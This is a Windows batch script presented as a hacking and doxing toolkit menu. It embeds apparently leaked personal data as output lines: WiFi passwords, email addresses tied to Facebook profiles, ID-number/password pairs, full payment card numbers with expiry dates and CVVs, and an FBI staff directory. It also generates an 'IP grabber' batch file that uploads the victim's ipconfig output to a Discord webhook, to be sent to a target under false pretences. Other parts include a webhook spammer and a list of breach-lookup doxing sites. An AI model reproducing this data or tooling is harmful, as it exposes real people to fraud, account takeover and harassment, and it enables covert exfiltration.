@echo off
chcp 65001
title bobbyy
color 7
:menu
cls
echo                                      [96m(   .      )    
echo                                      [96m.; )  ' (( (
echo                                      [96m_"., ,._'_
echo                             [96m; )  ' (╔══════════╗ ; )  ' (
echo                            [96m"., ,._' ║undercover║ "., ,._'
echo                            [96m╔════════╚══════════╝════════╗ 
echo                            [96m║         UNDERCOVER   [96m║
echo                            [96m╚════════════════════════════╝ 

echo                      [96m.  ; )  ' (( (" )    ;(.; )  ' (( (" ) 
echo                           [96m_"., ,._'_.,)__"., ,_"., ,._'_.,)__
echo                              [96m╔ ╦═╔═╔═╗╔═╦ ╦╔═╦═╠
echo                              [96m╠
echo                              [96m╚═╩╚═╚═╩ ╩╚═╩ ╩╚═╩╚
echo           (01) = ├─── Fbi info                   (07)   = ├───ip grabber
echo           (02) = ├──  Credit cards amazon        (08)   = ├── doxing tools
echo           (03) = ├─── Port scanner               (09)   = ├───get info from website
echo           (04) = ├─── cia mails                  (10)   = ├───webhook spammer  
echo           (05) = ├──  facebook mails             (11)   = ├── ip pinger 
echo           (06) = ├─── user lookup                (12)   = ├───wifi passwords                          

echo │
set /p choice= └───  



if %choice%==01 goto fbi
if %choice%==02 goto cc
if %choice%==04 goto cia
if %choice%==05 goto fb
if %choice%==03 goto scanIPRange
if %choice%==06 goto username_lookup
if %choice%==07 goto create_ip_grabber_script
if %choice%==08 goto doxxintools
if %choice%==09 goto getIPAddressFromWebsite
if %choice%==10 goto sendMessageViaWebhook
if %choice%==11 goto ipPinger
if %choice%==12 goto wifi

:wifi
cls
echo  [92mWifi Name : Ziggo1376281 ^| Password : chrhxasJdkt4
echo  [96mWifi Name : KPN8DEC96 ^| Password : cbdKNtx12MWkHMhW
echo  [92mWifi Name : Ziggo4416071 ^| Password : m6pLsmzbpqjq
echo  [96mWifi Name : huuske ^| Password : Otternest14
echo  [92mWifi Name : VFNL-E2BDA0 ^| Password : 48Z2YS37NE936
echo  [96mWifi Name : H369A22BD7E ^| Password : 9DEFC5F9C69D
echo  [92mWifi Name : KPN543136 ^| Password : ZCPXwFfxc7LJJGzb
echo  [96mWifi Name : H368N10501A ^| Password : 7D57DC566229
echo  [92mWifi Name : ZiomekDom ^| Password : uuli123456789
echo  [96mWifi Name : xiaomi-repeater-v2_miap8474 ^| Password :
echo  [92mWifi Name : ELE-L29%2061%CloudClone ^| Password : 22786992
echo  [96mWifi Name : AP_902000501 ^| Password :
echo  [92mWifi Name : Ziomek_Dom ^| Password : uuli123456789
echo  [96mWifi Name : Tenda_8506E8 ^| Password :
echo  [92mWifi Name : DomZiomek ^| Password : uuli123456789
echo  [96mWifi Name : ZIOMEK_DOM ^| Password : uuli123456789
echo  [92mWifi Name : Abra_VIP ^| Password : AbRa2012
echo  [96mWifi Name : BELL064 ^| Password : 259C439A5579
echo  [92mWifi Name : Viktor ^| Password : Viktor2011
echo  [96mWifi Name : A.Toni1 ^| Password : E35A14453513
echo  [92mWifi Name : Krasnborscy ^| Password : oliwiaibartek
echo  [96mWifi Name : ASUS_RPAC56 ^| Password : honda2000
echo  [92mWifi Name : KPN4DD026 ^| Password : w2htGJMNmc9wbZ3m
echo  [96mWifi Name : VGV75196133AA ^| Password : Hmt64Gp7PdLy
echo  [92mWifi Name : iPhone Ryshano ^| Password : Yolo_013
echo  [96mWifi Name : iPhone ^| Password : Yolo_013
echo  [92mWifi Name : Wifi#Villa366 ^| Password : 9142Villa366
pause
goto menu

:exit
exit


:ipPinger
cls
echo           [94m▪  [37m ▄▄▄·    [94m ▄▄▄[37m·▪   ▐ ▄ [94m ▄▄ • [37m▄▄▄ .[94m▄▄▄  
echo           [94m██ [37m▐█ ▄█    [94m▐█ ▄[37m███ •█▌▐█[94m▐█ ▀ ▪[37m▀▄.▀·[94m▀▄ █·
echo           [94m▐█·[37m ██▀·    [94m ██▀[37m·▐█·▐█▐▐▌[94m▄█ ▀█▄[37m▐▀▀▪▄[94m▐▀▀▄ 
echo           [94m▐█▌[37m▐█▪·•    [94m▐█▪·[37m•▐█▌██▐█▌[94m▐█▄▪▐█[37m▐█▄▄▌[94m▐█•█▌
echo           [94m▀▀▀[37m.▀       [94m.▀  [37m ▀▀▀▀▀ █▪[94m·▀▀▀▀ [37m ▀▀▀ [94m.▀  ▀
set /p "ip=Enter ip address: "

ping %ip%
pause
exit /b

:sendMessageViaWebhook
set /p webhook=Enter the webhook URL: 
curl --head --silent --fail "%webhook%" >nul 2>&1
if %errorlevel% neq 0 (
echo [96m╔════════════════════════════════════════════════════════════════════════════════╗
echo ║       [31mERROR: Failed to connect to the webhook. The webhook might not be real. [96m ║
echo [96m╚════════════════════════════════════════════════════════════════════════════════╝
  pause
  goto menu
)
set /p message=Enter the message to send: 
set /p count=Enter the number of times to send the message:
echo [96m╔══════════════════════════════╗ 
echo ║[96mConnecting to the webhook     ║
echo [96m╚══════════════════════════════╝
timeout /t 5 >nul
echo.
setlocal enabledelayedexpansion
for /l %%i in (1,1,%count%) do (
  set /a counter=%%i
  <nul set /p "=[?]Connection up. Sending messages"
  curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"!message!\"}" !webhook! >nul 2>&1
  if %errorlevel% neq 0 (
    echo.
    echo Error: Failed to connect to the webhook. The webhook might not be real
    pause
    goto menu
  )
  echo.
)
endlocal
echo [96m╔════════════════════════════════════╗
echo ║        [96mMessages sent               ║
echo [96m╚════════════════════════════════════╝
pause
goto menu

:getIPAddressFromWebsite
cls
set /p "website=Enter a URL[?] "
echo ╔════════════════════════════════════════╗
echo ║[96m[?]Finding information on %website%   ║
echo ╚════════════════════════════════════════╝
timeout /t 5 >nul
nslookup %website%
pause
exit /b

:doxxintools
cls
echo [96m╔════════════════════════╗
echo ║     [31m?leaksearch?       [96m║
echo [96m╚════════════════════════╝   
 echo [96mhttps://intelx.io                                           
 echo [96mhttps://leakpeek.com                                        
 echo [96mhttps://leak-lookup.com                                     
 echo [96mhttps://snusbase.com/search                                 
 echo [96mhttps://haveibeenpwned.com                                  
 echo [96mhttps://www.dehashed.com/                                    
 echo [96mhttps://cybernews.com/personal-data-leak-check              
 echo [96mhttps://breachdirectory.com/search                          
 echo [96mhttps://breachdirectory.org                                 
 echo [96mhttps://leakcheck.net                                       
 echo [96mhttps://breachdbsztfykg2fdaq2gnqnxfsbj5d....onion.pet       
 echo [96mhttps://aleph.occrp.org                                     
 echo [96mhttps://checkleaked.cc                                      
 echo [96mhttps://namescan.io/freeemailcompromisedcheck               
 echo [96mhttps://monitor.firefox.com                                 
 echo [96mhttps://www.fasterbroadband.co.uk/tools/...ach-search       
 echo [96mhttps://www.hotsheet.com/inoitsu                            
 echo [96mhttps://checkashleymadison.com                              
 echo [96mhttps://surfshark.com                                       
 echo [96mhttps://tragercop.1password.com                             
 echo [96mhttps://ghostproject.fr                                     
 echo [96mhttps://saverudata.online/ (RussinLeak DB search)           
echo [96m╔════════════════════════╗                                
echo ║     [31m?PhoneSearch?      [96m║                          
echo [96m╚════════════════════════╝                          
echo [96mhttps://www.spydialer.com                         
echo [96mhttps://www.numlookup.com                         
echo [96mhttps://www.truecaller.com                        
echo [96mhttps://www.searchyellowdirectory.com             
echo [96mhttps://demo.phoneinfoga.crvx.fr                  
echo [96mhttps://onlinesim.io                              
echo [96mhttps://www.411.com                               
echo [96mhttps://411.info                                  
echo [96mhttps://www.calleridtest.com                      
echo [96mhttps://thatsthem.com/reverse-phone-lookup        
echo [96mhttp://www.fonefinder.net                         
echo [96mhttps://www.callersmart.com                      
echo [96mhttps://www.phonevalidator.com                   
echo [96mhttps://freecarrierlookup.com                     
echo [96mhttps://www.usphonebook.com                      
echo [96mhttps://pccare99.com                              
echo [96mhttps://www.numberguru.com                        
echo [96mhttps://www.calltruth.com/                        
echo [96mhttps://www.allareacodes.com                      
echo [96mhttps://www.peoplebyphone.com                     
echo [96mhttps://www.confidentialphonelookup.com           

pause
goto menu

:create_ip_grabber_script
cls
echo [37m╔══════════════════════════╗
echo ║ [96mIp Grabber Script        [37m║
echo [37m╚══════════════════════════╝
set /p "webhook=Enter your Discord webhook URL: "


if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Connection (True) Making ip logger script.
timeout /t 5 >nul

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo A new file is in your display menu. Send it to your target and tell them to open it twice then their ip will be sent in webhook
pause
goto menu

:username_lookup
set /p username=Enter the username you want to lookup: 
 
echo [94m╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
echo [94m║ .dP"Y8 888888    db    88""Yb  dP""b8 88  88     88""Yb 888888 .dP"Y8 88   88 88     888888 .dP"Y8║
echo [94m║ `Ybo." 88__     dPYb   88__dP dP   `" 88  88     88__dP 88__   `Ybo." 88   88 88       88   `Ybo."║
echo [94m║ o.`Y8b 88""    dP__Yb  88"Yb  Yb      888888     88"Yb  88""   o.`Y8b Y8   8P 88  .o   88   o.`Y8b║
echo [94m║ 8bodP' 888888 dP""""Yb 88  Yb  YboodP 88  88     88  Yb 888888 8bodP' `YbodP' 88ood8   88   8bodP'║
echo [94m╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝ 
echo.
echo                [37m╔════════════════════════════════════════════════════════════
echo                ║[94mTikTok: [37mhttps://www.tiktok.com/@%username%
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mInstagram: [37mhttps://www.instagram.com/%username%             
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mFacebook: [37mhttps://www.facebook.com/%username%               
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mTwitter: [37mhttps://www.twitter.com/%username%                 
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mSteam: [37mhttps://steamcommunity.com/id/%username%             
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mYouTube: [37mhttps://www.youtube.com/user/%username%            
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mGitHub: [37mhttps://www.github.com/%username%                   
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mReddit: [37mhttps://www.reddit.com/user/%username%              
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mDiscord: [37mhttps://www.discord.com/%username%                 
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mSoundCloud: [37mhttps://soundcloud.com/%username%               
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mTwitch: [37mhttps://www.twitch.tv/%username%                   
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mSnapchat: [37mhttps://www.snapchat.com/add/%username%           
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mPinterest: [37mhttps://www.pinterest.com/%username%             
echo                [37m╚════════════════════════════════════════════════════════════
pause
goto :menu

goto :menu

:scanIPRange
cls
echo                                    [96m(   .      )    
echo                                    [96m.; )  ' (( (
echo                                    [96m_"., ,._'_
echo                           [96m; )  ' (╔══════════╗ ; )  ' (
echo                          [96m"., ,._' ║  Pscan   ║ "., ,._'
echo                          [96m╔════════╚══════════╝════════╗ 
echo                          [96m║         Ip Address         [96m║
echo                          [96m╚════════════════════════════╝ 

echo                     .  ; )  ' (( (" )    ;(.; )  ' (( (" ) 
echo                          _"., ,._'_.,)__"., ,_"., ,._'_.,)__
echo                         ┌─┐┌─┐┬─┐┌┬┐  ┌─┐┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐
echo                         ├─┘│ │├┬┘ │   └─┐│  ├─┤││││││├┤ ├┬┘
echo                         ┴  └─┘┴└─ ┴   └─┘└─┘┴ ┴┘└┘┘└┘└─┘┴└─
set /p ipRange=


echo %ipRange% | findstr /r /i /c:"^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}$" >nul 2>&1
if %errorlevel% equ 0 (
    nmap -p- -T4 -Pn %ipRange%
) else (
    nmap --top-ports 100 -T4 -Pn %ipRange%
)

if %errorlevel% neq 0 (
    echo An error occurred while scanning the IP range. Please check the input and try again.
    pause
    goto scanIPRange
) else (
    pause
    goto menu
)

:fb
cls
echo [96m   █████▒▄▄▄       ▄████▄  ▓█████  ▄▄▄▄    ▒█████   ▒█████   ██ ▄█▀
echo [92m ▓██   ▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
echo [96m ▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒███   ▒██▒ ▄██▒██░  ██▒▒██░  ██▒▓███▄░ 
echo [92m ░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██   ██░▓██ █▄ 
echo [96m ░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░▓█  ▀█▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
echo [92m  ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
echo  [96m ░       ▒   ▒▒ ░  ░  ▒    ░ ░  ░▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
echo  [92m ░ ░     ░   ▒   ░           ░    ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
echo  [96m             ░  ░░ ░         ░  ░ ░          ░ ░      ░ ░  ░  ░   
echo  [92m                 ░                     ░                          
echo ababalo31@aol.com,Angelo,Florez,http://www.facebook.com/profile.php?id=25309269
echo ababartek@hotmail.com,Alice,Bartek,http://www.facebook.com/profile.php?id=1324853619
echo ababington@flchamber.com,Adam,Babington,http://www.facebook.com/profile.php?id=1536062732
echo ababos@gmail.com,Andrea,Babos,http://www.facebook.com/profile.php?id=718747538
echo ababsolutely@aol.com,Ab,Martinez,http://www.facebook.com/profile.php?id=1074862473
echo ababu@hotmail.com,Babu,Anantharaman,http://www.facebook.com/profile.php?id=100000530651452
echo ababykittn@yahoo.com,Jerri,Huff,http://www.facebook.com/profile.php?id=534029457
echo ababymilo@yahoo.com,Marcus,Bullock,http://www.facebook.com/profile.php?id=716139601
echo ababysis3@aol.com,Alicia,Yuvonne,http://www.facebook.com/profile.php?id=100000214090067
echo abacal@cox.net,Amy,Bacal,http://www.facebook.com/profile.php?id=1751185827
echo abacarealtyrls@comcast.net,Roland,L.,http://www.facebook.com/profile.php?id=602192290
echo abaccam@iowarealty.com,Amanda,Harrington,http://www.facebook.com/profile.php?id=648147489
echo abachma1@rochester.rr.com,Lisa,Camelio,http://www.facebook.com/profile.php?id=1550635335
echo abachtell@stirlingprop.com,Ana,Bachtell,http://www.facebook.com/profile.php?id=1794375338
echo abaco8@aol.com,Joany,Arpe,http://www.facebook.com/profile.php?id=586418326
echo abacus_hk@comcast.net,Harry,E.,http://www.facebook.com/profile.php?id=100000184876408
echo abacus1990bk@yahoo.com,Tatiana,Lupoloff,http://www.facebook.com/profile.php?id=1547536908
echo abacusonme@aol.com,Patrick,Baker,http://www.facebook.com/profile.php?id=100001409982047
echo abacusrealestate@msn.com,Tony,Chiang,http://www.facebook.com/profile.php?id=507511121
echo abad1975@verizon.net,Emilio,Abad,http://www.facebook.com/profile.php?id=1192774148
echo abad369@yahoo.com,Diana,Diaz,http://www.facebook.com/profile.php?id=100000482800195
echo abadaba182@aol.com,Brett,Hill,http://www.facebook.com/profile.php?id=652435254
echo abadattitude4u@aol.com,Teresa,Smith,http://www.facebook.com/profile.php?id=100000112576763
echo abademil_99@yahoo.com,Anthony,Ademiluyi,http://www.facebook.com/profile.php?id=1180813718
echo abader@chemail.com,Austin,Bader,http://www.facebook.com/profile.php?id=1554953791
echo abadger830@aol.com,Afton,Badger,http://www.facebook.com/profile.php?id=100000817026625
echo abaffaro@realtytrust.com,Andrea,Baffaro,http://www.facebook.com/profile.php?id=1501845951
echo abagail62@msn.com,Lisa,Bremer,http://www.facebook.com/profile.php?id=1358230457
echo abaggaley@hotmail.com,Amanda,Baggaley-Lacerte,http://www.facebook.com/profile.php?id=645735207
echo abagherian@hotmail.com,Akram,Bagherian,http://www.facebook.com/profile.php?id=528297808
echo abagna@hotmail.com,Alicia,Beatriz,http://www.facebook.com/profile.php?id=100001336922422
echo abagnall@yahoo.com,Andrew,Bagnall,http://www.facebook.com/profile.php?id=692131611
echo abagnola@hotmail.com,Armando,Bagnola,http://www.facebook.com/profile.php?id=1455559247
echo abahjay@cox.net,Jay,Abah,http://www.facebook.com/profile.php?id=632759941
echo abaijnauth@nyc.rr.com,Anita,Baijnauth,http://www.facebook.com/profile.php?id=709666540
echo abailey5788@sbcglobal.net,Armelia,Bailey,http://www.facebook.com/profile.php?id=1685426424
echo abailie@mindspring.com,Andy,Bailie,http://www.facebook.com/profile.php?id=602523426
echo abaily@hotmail.com,Tony,Baily,http://www.facebook.com/profile.php?id=580413613
echo abainlardi@houlihanlawrence.com,Alaina,Cavaliere,http://www.facebook.com/profile.php?id=1273140535
echo abake1@verizon.net,Mary,B,http://www.facebook.com/profile.php?id=100000459268332
echo abaker@aspencontractinginc.com,Andy,Baker,http://www.facebook.com/profile.php?id=100000781895379
echo abaker38@cox.net,Angela,Baker,http://www.facebook.com/profile.php?id=1019149308
echo abaker4_@hotmail.com,Andrew,Baker,http://www.facebook.com/profile.php?id=505263396
echo abaker4life_40@yahoo.com,Annie,Baker,http://www.facebook.com/profile.php?id=100000412595107
echo abakhouse@yahoo.com,Ashley,Baker,http://www.facebook.com/profile.php?id=1537611771
echo abalcantar@yahoo.com,Ana,Macias,http://www.facebook.com/profile.php?id=1577021402
echo abalderama@gmail.com,Alan,Balderama,http://www.facebook.com/profile.php?id=100000075612240
echo abalderrama1@yahoo.com,Alonso,Balderrama,http://www.facebook.com/profile.php?id=100000797603639
echo abaldino@aol.com,Angela,Boccanfuso,http://www.facebook.com/profile.php?id=1271078442
echo abaldonado@hotmail.com,Aurea,van,http://www.facebook.com/profile.php?id=100001326201698
echo abaldridge1@yahoo.com,Adam,Baldridge,http://www.facebook.com/profile.php?id=1104686762
echo abaldwin07@yahoo.com,Amber,Baldwin,http://www.facebook.com/profile.php?id=607682923
echo abales@cbtulsa.com,Ashley,Bales,http://www.facebook.com/profile.php?id=1353295899
echo aball@hkaa.com,Hka,Anderson,http://www.facebook.com/profile.php?id=1661267218
echo aball@theballgroupinc.com,Allen,Ball,http://www.facebook.com/profile.php?id=1460523385
echo aball_law@hotmail.com,Angela,M,http://www.facebook.com/profile.php?id=1180754817
echo aballan_11@hotmail.com,Angel,Guillermo,http://www.facebook.com/profile.php?id=813693568
echo aballard@windermere.com,Amy,Ballard,http://www.facebook.com/profile.php?id=660176697
echoabaloch@hotmail.com,Akhtar,Baloch,http://www.facebook.com/profile.php?id=720801057
echo abalone1958@live.com,Ruben,Vanta,http://www.facebook.com/profile.php?id=100000804196727
echo abalos_ashley2001@yahoo.com,Ashley,Abalos,http://www.facebook.com/profile.php?id=100000177256118
pause
goto menu

:cia
cls
echo [96m  ▄████▄   ██▓ ▄▄▄          ███▄ ▄███▓ ▄▄▄       ██▓ ██▓      ██████ 
echo [92m ▒██▀ ▀█  ▓██▒▒████▄       ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    ▒██    ▒ 
echo [96m ▒▓█    ▄ ▒██▒▒██  ▀█▄     ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    ░ ▓██▄   
echo [92m ▒▓▓▄ ▄██▒░██░░██▄▄▄▄██    ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░      ▒   ██▒
echo [96m ▒ ▓███▀ ░░██░ ▓█   ▓██▒   ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒▒██████▒▒
echo [92m ░ ░▒ ▒  ░░▓   ▒▒   ▓▒█░   ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
echo [96m   ░  ▒    ▒ ░  ▒   ▒▒ ░   ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░░ ░▒  ░ ░
echo [92m ░         ▒ ░  ░   ▒      ░      ░     ░   ▒    ▒ ░  ░ ░   ░  ░  ░  

                                                                
echo RAFFAELLSANTOSP13:911439
echo xxx.xxxxx.x7-9:18011978
echo 128.329.488-55:050297
echo 106.104.237-54:22891754
echo UNKNOWN:37277845
echo 00895969785:071146
echo 055.596.222-90:250874
echo 078.344.657-83:wm3512
echo xxx.xxxxx.x7-9:*BWdP4hR
echo 200.71959.87-9:century90
echo UNKNOWN:nassif74
echo 56758626253:602204
echo UNKNOWN:AgFj5GkegPAc920Z
echo 051.709.448-70:300786
echo 02/02/1978:18011978
echo 45615756268:m4r1072
echo 069.790.629-99:959140
echo tiagoliveirafla88:T250316
echo 90309863015:560758
echo 122.416.126-26:16653651
echo 87739313300:39271809
echo 00591600986:527068
echo UNKNOWN:974813Ar
echo 367.419.868-12:130586
echo 280.227.718-99:120713
echo 082.394.846-38:4LDkM9iRvVp
echo c.bertulio.favero@gmail.com:250423
echo 008.959.697-85:131307
echo cerqueira237@gmail.com:891754
echo UNKNOWN:072814
echo 081.969.974-85:36040581
echo 114.655.077-44:563456
echo UNKNOWN:22891754
echo UNKNOWN:tr2529
echo UNKNOWN:61429178
echo 87923130787:563457
echo CARMEMROLOFF2:yec24179
echo 00992841623:13099904
echo 20054505970:ss609127
echo 745.561.774-72:141120
echo JESSICASALES1:911578
echo caixa:98973805
echo 106.117.927-37:levidairis092204
echo 35606729881:050297
echo 013.827.122-43:91143968
echo 118.957.687-21:312407
echo 10715108120:203346
echo 635241:635241
echo UNKNOWN:091197
echo 69416400068:93741973
echo 78783011587:223005
echo 078.344.657-83:197010
echo 06571515997:135790
echo 20637370702:rafa1994
echo barroscassia186@gmail.com:39288726
echo UNKNOWN:48116845
echo UNKNOWN:76306261
echo UNKNOWN:200372
pause
goto menu

:cc
cls
echo  [92m ▄████▄   ██▀███  ▓█████ ▓█████▄  ██▓▄▄▄█████▓    ▄████▄   ▄▄▄       ██▀███  ▓█████▄   ██████ 
echo  [96m ▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▓  ██▒ ▓▒   ▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██    ▒ 
echo   [92m ▒▓█    ▄ ▓██ ░▄█ ▒▒███   ░██   █▌▒██▒▒ ▓██░ ▒░   ▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌░ ▓██▄   
echo  [96m ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██░░ ▓██▓ ░    ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌  ▒   ██▒
echo  [92m ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░▒████▓ ░██░  ▒██▒ ░    ▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ▒██████▒▒
echo  [96m ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▓    ▒ ░░      ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░
echo    [92m ░  ▒     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ▒ ░    ░         ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒ ░ ░▒  ░ ░
echo  [96m ░          ░░   ░    ░    ░ ░  ░  ▒ ░  ░         ░          ░   ▒     ░░   ░  ░ ░  ░ ░  ░  ░  
echo  [92 m░ ░         ░        ░  ░   ░     ░              ░ ░            ░  ░   ░        ░          ░  
echo  [96m ░                         ░                      ░                            ░               
echo [94m5555990000829259/06/25[0m
echo [94m5555990000466201/01/25[0m
echo [94m555599000029090/02/26[0m
echo [94m5555990000733378/05/25[0m
echo [94m5555990000657874/09/25[0m
echo [94m5332480585016035^|07^|2024^|846[0m
echo [94m4207670238212164^|02^|2025^|444[0m
echo [94m4317930009341460^|12^|22^|332[0m
echo [94m4317930009276740^|12^|2022^|682[0m
echo [94m4317930009330513^|12^|2022^|113[0m
echo [94m4591008880402672^|05^|2025^|708[0m
echo [94m4506445718253212^|04^|2026^|093[0m
echo [94m4147098208164723^|11^|2025^|895[0m
echo [94m4317930009341460^|12^|2022^|332[0m
echo [94m4011540098993946^|08^|24^|271[0m
echo [94m6011499466824719^|01^|30^|526[0m
echo [94m5278540002266723^|11^|2024^|314[0m
echo [94m5278540017392134^|03^|25^|980[0m
echo [94m4424108574973609^|03^|2027^|549[0m
echo [94m5579306081053705^|11^|2022^|325[0m
echo [94m4312311113115113^|11^|2026^|112[0m
echo [94m5143773824198641^|12^|22^|968[0m
echo [94m5325617980924466^|06^|23^|800[0m
echo [94m5254750064884259^|02^|23^|121[0m
echo [94m5356663104970508^|04^|2025^|945[0m
echo [94m4960880023615102^|10^|2023^|073[0m
echo [94m4166216358020455^|02^|2023^|731[0m 
pause
goto menu

:exit
exit

:fbi
cls
echo   █████▒▄▄▄▄    ██▓    ███▄ ▄███▓ ▄▄▄       ██▓ ██▓      ██████ 
echo ▓██   ▒▓█████▄ ▓██▒   ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    ▒██    ▒ 
echo ▒████ ░▒██▒ ▄██▒██▒   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    ░ ▓██▄   
echo ░▓█▒  ░▒██░█▀  ░██░   ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░      ▒   ██▒
echo ░▒█░   ░▓█  ▀█▓░██░   ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒▒██████▒▒
echo  ▒ ░   ░▒▓███▀▒░▓     ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
echo  ░     ▒░▒   ░  ▒ ░   ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░░ ░▒  ░ ░
echo  ░ ░    ░    ░  ▒ ░   ░      ░     ░   ▒    ▒ ░  ░ ░   ░  ░  ░  
echo         ░       ░            ░         ░  ░ ░      ░  ░      ░  
echo              ░                                                 
echo Abruzzino, Wendy  SUPVY LEGAL INSTRUMENTS EXAMINER 304-625-7190   US Wendy.Abruzzino@ic.fbi.gov  
echo Absher, Carol r  INTERN       Carol.Absher@ic.fbi.gov  
echo Abusuneima, Nehad  TRANSLATORS AND INTERPRETERS 646-696-2486 2486   US Nehad.Abusuneima@ic.fbi.gov  
echo Abusuneima, Nizar  CONTRACTOR 646-696-2405   US Nizar.Abusuneima@ic.fbi.gov  
echo Abusway, Eyad A  TASK FORCE OFFICER 859-426-3355   US Eyad.Abusway@ic.fbi.gov  
echo Acayan, Justina A  FINANCIAL OPERATIONS SPECIALIST 415-553-7400     Justina.Acayan@ic.fbi.gov  
echo Accardo, Matthew W  SPECIAL AGENT 415-558-1148   US Matthew.Accardo@ic.fbi.gov  
echo Accardo, Paula J  EVIDENCE TECHNICIAN 623-466-1999 1265     Paula.Accardo@ic.fbi.gov  
echo Ace, Brian K  RELIEF SUPERVISOR 312-829-8357   US Brian.Ace@ic.fbi.gov  
echo Acedillo, Dori B  OPERATIONAL SUPPORT TECHNICIAN 415-553-7400 2702   US Dori.Acedillo@ic.fbi.gov  
echo Acee, Bryan M  RELIEF SUPERVISOR 505-889-1663   US Bryan.Acee@ic.fbi.gov  
echo Aceituno, Roberto A  FOREIGN OPERATIONS SPECIALIST 202-324-9830 49830   US Roberto.Aceituno@ic.fbi.gov  
echo Aceto, Elyse A    202-233-1249   US Elyse.Aceto@ic.fbi.gov  
echo Acevedo, Carlos A  OPERATIONAL SUPPORT TECHNICIAN 787-997-2600   US Carlos.Acevedo@ic.fbi.gov 
echo Burke, April A  MGMT&PROG ANAL 304-367-3714   US April.Burke@ic.fbi.gov  
echo Burke, Ashley M  DETAILEE 703-686-6144 6144   US Ashley.Burke@ic.fbi.gov  
echo Burke, Brandon E  RELIEF SUPERVISOR 314-589-2674 2674   US Brandon.Burke@ic.fbi.gov  
echo Burke, Brian E  TASK FORCE OFFICER 585-297-3900     Brian.Burke2@ic.fbi.gov  
echo Burke, Brian R  SPECIAL AGENT 562-982-1715   US Brian.Burke@ic.fbi.gov  
echo Burke, Charletta T  PERSONNEL SECURITY SPECIALIST-FO 202-278-3433 3433   US Charletta.Burke@ic.fbi.gov  
echo Burke, Christopher J  SECONDARY RELIEF SUPERVISOR 617-223-6282 6282   US Christopher.Burke@ic.fbi.gov  
echo Burke, Cody D  RELIEF SUPERVISOR 213-989-6551   US Cody.Burke@ic.fbi.gov  
echo Burke, Coreen L  ITSPEC (SYSADMN/CUSTSPT) 704-604-5903 6329     Coreen.Burke@ic.fbi.gov  
echo Burke, Dennis  LEGAL INSTRUMENTS EXAMINER 304-625-7017     Dennis.Burke2@ic.fbi.gov  
echo Burke, Dennis  TASK FORCE OFFICER 202-278-2523 2523   US Dennis.Burke@ic.fbi.gov  
echo Burke, Dominick D  SUPVY FOREIGN LANGUAGE PROGRAM COORD 518-431-7262   US Dominick.Burke@ic.fbi.gov  
echo Burke, Donald E  TASK FORCE OFFICER 562-409-1400     Donald.Burke@ic.fbi.gov  
echo Burke, Gregory  INVESTIGATIVE SPECIALIST 904-239-0680   US Gregory.Burke@ic.fbi.gov  
echo Burke, Jason M  SPECIAL AGENT 754-703-3776   US Jason.Burke@ic.fbi.gov  
echo Burke, Jeffrey G  DETAILEE 408-569-1976     Jeffrey.Burke@ic.fbi.gov  
